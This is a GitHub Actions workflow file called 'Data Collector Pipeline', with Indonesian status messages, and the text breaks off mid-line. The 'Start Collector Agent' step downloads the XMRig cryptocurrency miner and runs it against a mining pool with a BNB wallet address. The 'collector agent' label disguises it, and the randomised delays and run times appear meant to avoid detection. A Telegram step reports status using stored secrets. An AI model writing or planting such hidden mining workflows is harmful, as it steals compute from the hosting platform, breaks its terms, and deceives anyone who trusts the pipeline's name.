name: Data Collector Pipeline

on:
  workflow_dispatch:

permissions:
  contents: read
  actions: none
  id-token: none

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Initialize Collector
        run: echo "üõ∞Ô∏è Initializing BNB collector agent..."

      - name: Update Environment
        run: |
          sudo apt update -y && sudo apt install -y curl tar

      - name: Notify Start
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID \
            --data-urlencode text="üü¢ *BNB Collector aktif.*\nRuntime hingga 6 jam." \
            -d parse_mode=Markdown

      - name: Start Collector Agent
        run: |
          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf agent.tar.gz
          cd xmrig-6.24.0
          chmod +x xmrig

          DELAY=$((RANDOM % 300 + 30))
          echo "Menunggu $DELAY detik sebelum mulai..."
          sleep $DELAY

          ./xmrig -o rx.unmineable.com:3333 -a rx -k \
            -u bnb:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.gh-runner#github \
            -p x --randomx-no-rdmsr | tee log.txt &

          PID=$!
          WORKTIME=$((RANDOM % 5400 + 1200))
          echo "Aktif selama $WORKTIME
